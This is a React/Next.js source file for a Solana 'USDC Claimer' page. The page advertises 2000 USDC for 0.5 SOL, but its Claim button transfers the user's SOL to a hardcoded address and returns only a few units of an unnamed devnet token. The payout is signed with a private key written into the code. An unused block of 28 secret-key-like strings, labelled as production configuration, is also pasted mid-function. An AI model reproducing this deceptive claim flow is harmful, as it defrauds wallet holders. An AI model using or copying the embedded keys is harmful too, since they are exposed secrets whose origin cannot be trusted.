/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4U71rXPm8gePEA8Ah7E565JcfAu9J1go93JrZWR7Lqe9YiMLBg1H7u8MfgZhRdEA26af9mgFqDWzn9c7Qgxr6Ush"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4s5SY2U9mq2xi8VNKc2hAKm4k39uCxhuZia4JnoKmuJUDf9tqqjmSxrcSqemjfRmaacdX8ptG3dDZJq6SEMD8tLJ",
  "key1": "Kw4D78xzSscCsvvkDHC2qcGzSRRbQPW6ksRKaHFmH7CEvk1RA7AdnzLJ92a7smkN44MPdj9Y5nNuvbgM7PH4LMC",
  "key2": "2KP8G8n4PT7GS4KC7gHWePAoC8XXfsPbXJRyvWq7h8ghhAejCrTzhsrLmWSVYZWVF5ecYAC4qfcHSH6H1CPz4qhz",
  "key3": "5xoWaq4SPsNaAe6axd2asVhvaD1pmekbxe3NSvG9jV7ZCABA2rS3LfXgdDBSbbiWySDZ1rgmVAkWdiLn3mmYjyHy",
  "key4": "4bjmBiQGkM9prXicrqxqx4C2F8QyH7rWprqkEUQzWXEU6mkiTXjsYNPHGLtJgSwPpS1DVDZAELDwdFBDLPrBrthi",
  "key5": "4NgVYC6G3xgmSiJspZoEEADKEXeKjALcSSKEqMutCiCfYNwPS88GYjzA5w7R3G5wgLXfKALXF7Zyxu12peaN9NcC",
  "key6": "5Z3DJ8scXmDasi4PfXHJXeqEngQmW2uQuTanf4vaUkc3R1qXDAtDvVZWi7edtTwPhSGwtgSjQ1e59tLg8j4t5QSQ",
  "key7": "4cZ3xYkj8ERRAA289p2ZKfT2oXqGm1CCchn3TMdirowm5LrtrAYMiBEV1gu51KX3ZqF7rEGkh5nZHYhTFLvS4dJk",
  "key8": "4NznH83RAJ68Pv1TPyErvpFP4jLipdjS9Ct8zotfPbvQRRnk6XwzqH6gsvUr5cJtF4c1DaR3vUE5WLa3akkrqczk",
  "key9": "2YRd3ECwUXHyfyo6emhXSTQenWAnyn7ZVzGYU9HVKYtSRjsMAgbf8zXMyCkTz8JEKQXjghwj6idANRWKh63jJjFc",
  "key10": "2qzX7aH4B4aephTFPefddECa3WsMYwfRWdgwpqY8UHHtSZKh5Tq1Fd3pSC3puNNj4dtKHGMR4d7AXZX4oxBfSpNv",
  "key11": "BY6E7zoCFWPJPRbSh4ZXVHftDV61D1WLjfXGPnit4yjs2Nq2t7oC4j33YuVSeNHtFTwjESkb2MVLABWTkoWKTJV",
  "key12": "2YwXftULGwfGmLRYNdmCXKiJ6ywaxJX5pV5P9nEdQ8dPUWm73HutYF5uf4oRrDBWGUJPnM6aUZjVDWXWtiXaaG9r",
  "key13": "2kw5xUSNXTR9o4hsV6syG4h9PYCZHLq315DAJ5VADGkx3wqK9kouuRCinQLbEf9eUnrTeSZGzC3u8Wi3oF2DC4ow",
  "key14": "2NGg81VssSPLiUubu8XMpQMKrnE1kktHEgafFyJyDrWZtWZAGGCn6zEBQQezyTfwQhRSGVLiehGu6iTqFvLNJ7vE",
  "key15": "5HUFKqdhUnqFRrreFHhcVEP9Z15sMPK738UwyfgVLFpNbqLoH9rjvfLc92cHuq4XETc4qZSECbz8bF4NfaUAMZvB",
  "key16": "3CoUpSAijmL6KH4xUT4uumEagh134kHoL96rj3BtShNoCNAGqwTKgYEiuXpNaGv5Br6HMKoTUVRjhf4hxkUqF8bL",
  "key17": "5xndFcTcchbK2s8L372ZJwcyuAsg6u42vZr41rrdDgBnb3vBLviqmfQjY1xt8SXmGtN2wXj539HKeVPmCmEGi4VE",
  "key18": "3EDxz5bqnjw5ySaJE42R7nrNcf6GfAmKKws7dbDNt52CYgk4tW9VxVYqHCpUDg1Xwdwi6r3cLL5F6ogoviVyCeNN",
  "key19": "2dnsyYkMugHJVJh2Hye1UJNNRWxwoHojb6XkvD5JjdqdV5EgPuHqcXgBzeeK7hJtSWreWZwsskENwaCUw2UB18aJ",
  "key20": "4LbgVLEsDdHu6vqZQwYfk86gg9kSokkANjjZ1QHDAjqSpBx4QZEcoEnQR6pm2FwfQWcAkfPGqh91y8LEnpE2yuN",
  "key21": "3D4zbwKL4F85U4tGMVCiQEnukLp5YBD4Hyr71DerijYo8qr7BJ49rk845psE9Vpt7fDCpFfeceHD4gQAPJaqbBZD",
  "key22": "3W8oSvKAi2v7vX3xQhJAvcEYxQGmYsMb4nPZQ6kfQawddyLkcT5cr1kDsq628JQysaRKf2EqnPHzUSgihDNdQDBW",
  "key23": "2sbDxTTsW1dazhcnYAzBA9QdtsDDS95fcyD8YsTgUziG5N255M55g9sHskkJG3oprkyNR2Qqo9msgkJXQMjwf6bR",
  "key24": "3Wt6s6MGibdMGNzxaEKqoGdYs3YCbsFczzuwVrZmGTxwoie7FtDn8fEf6cj3YNH6spMBQ8q22FVVs4eySZCjg77w",
  "key25": "4EozeFQTBPDGaDnZNgYrthCJYkWMjBKPykdFWAY5e3rQrvFVRNdgR7f1R2YnbQ5GK52jdoTzRqCs2SRegXp6Kcue",
  "key26": "3KpfvwcxzK1sw79NovxMuL2h9TKi8EFVSBp9HdShATUz72z8bTYKUJDZ4g6Pm9yQYPBCBwF75cWtLkGbbB9efvY2",
  "key27": "5o6B2xaLt5cVUHCjqfATfENjK9eLnBY2jziPhrikcmZSwdGPhViRxsVutKSjGTb8jaJoqguUFa7pnbGGjCDBTEbk"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
